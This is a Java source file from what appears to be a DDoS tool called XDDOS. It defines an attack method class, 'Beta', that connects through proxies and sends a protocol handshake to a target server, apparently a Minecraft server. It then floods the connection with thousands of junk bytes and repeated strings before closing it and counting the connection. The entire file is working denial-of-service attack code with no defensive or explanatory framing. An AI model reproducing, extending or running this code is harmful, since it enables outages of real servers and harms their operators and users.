package XD.XDDOS.methods.impl;

import java.io.IOException;

import XD.XDDOS.XDDOS;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.packet.Handshake;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Beta
implements IMethod{

    private byte[] handshake = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream bbbb = new ByteBufOutputStream(b);

        try {
            for(int i = 0; i < 2000; ++i) {
                while(i < 2300) {
                    bbbb.write(0);
                    bbbb.write(-1);
                    bbbb.write(2626);
                    bbbb.write(0);
                    bbbb.write(-6);
                    bbbb.write(13950);
                    ++i;
                    for(int j = 10 ; j > 0;j--){
                        bbbb.writeUTF("ツツツツツツ XD ツツツツツツ");
                    }
                }
            }
        } catch (IOException var7) {
            var7.printStackTrace();
        }

        channel.writeAndFlush(b);
        channel.writeAndFlush(bbbb);
        ++NettyBootstrap.integer;
        NettyBootstrap.totalConnections++;
        channel.close();
    }

}
